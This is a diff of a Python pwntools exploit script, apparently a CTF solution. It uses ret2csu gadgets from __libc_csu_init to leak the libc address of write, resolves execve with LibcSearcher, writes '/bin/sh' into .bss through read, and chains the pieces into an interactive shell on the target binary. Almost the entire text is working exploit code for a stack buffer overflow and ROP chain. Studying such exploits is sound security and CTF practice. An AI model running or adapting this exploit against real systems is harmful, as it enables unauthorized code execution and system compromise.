@@ -61,7 +61,7 @@ csu_alc = 0x4005f0
 
 # use libc_csu_init and return fuck
 def csu(reg_values, padding_over, padding_over1, final_address):
-    fuck = padding_over + [csu_init] + [0] + reg_values + [csu_alc] +  padding_over1 + [final_address]
+    fuck = padding_over + [csu_init] + [1] + reg_values + [csu_alc] +  padding_over1 + [final_address]
 
     fuck = flat(fuck)
 
@@ -77,9 +77,9 @@ def csu(reg_values, padding_over, padding_over1, final_address):
     
 write_address = exe.got['write']
 main_address = exe.symbols['main']
-reg_values = [0, 0, write_address, 1, write_address, 8]
+reg_values = [0, 1, write_address, 1, write_address, 8]
 padding_over1 = ['A'] * 56
-padding_over = ['A'] * 136
+padding_over = ['B'] * 136
 
 fuck = csu(reg_values, padding_over, padding_over1, main_address)
 io = start()
@@ -87,44 +87,46 @@ io.recvuntil('Hello, World\n')
 
 io.sendline(fuck)
 sleep(1)
+
 write_address = u64(io.recv(8))
-
-
 libc = LibcSearcher('write', write_address)
 
 libc_base = write_address - libc.dump('write')
 # get real system address
-system_addr = libc_base + libc.dump('system')
-read_addr = libc_base + libc.dump('read')
+# system_addr = libc_base + libc.dump('system')
+system_addr = libc_base + libc.dump('execve')
+
+read_addr =  exe.got['read']
 bss_base = exe.bss()
 
-
-
 # make /bin/bash string read(0, bss_base, 16)
-reg_values = [0, 0, read_addr, 0, bss_base, 16]
-padding_over = ['A'] * 136
-padding_over1 = ['A'] * 56
+reg_values = [0, 1, read_addr, 0, bss_base, 16]
+padding_over = ['C'] * 136
+padding_over1 = ['D'] * 56
 fuck = csu(reg_values, padding_over, padding_over1, main_address)
 
 
+print 'begin write address\n'
+
+io.recvuntil('Hello, World\n')
 io.sendline(fuck)
-io.send(p64(system_addr) + '/bin/sh\x00')
-gdb.attach(io, gdbscript=gdbscript)
+sleep(1)
+
+print 'final ', p64(system_addr) + "/bin/sh\x00"
+io.send(p64(system_addr) + "/bin/sh\x00")
+sleep(1)
+
+# get shell
+io.recvuntil('Hello, World\n')
+reg_values = [0, 1, bss_base, bss_base+8, 0, 0]
+padding_over = ['E'] * 136
+padding_over1 = ['F'] * 56
+fuck = csu(reg_values, padding_over, padding_over1, main_address)
+io.sendline(fuck)
+sleep(1)
 
 
 io.interactive()
-
-
-
-
-# # get shell
-# print io.recvline(timeout=1)
-# reg_values = [0, 0, bss_base, 0, bss_base+8, 0]
-# padding_over = ['A'] * 136
-# padding_over1 = ['A'] * 56
-# fuck = csu(reg_values, padding_over, padding_over1, main_address)
-# io.sendline(fuck)
-# io.interactive()
 
 
 
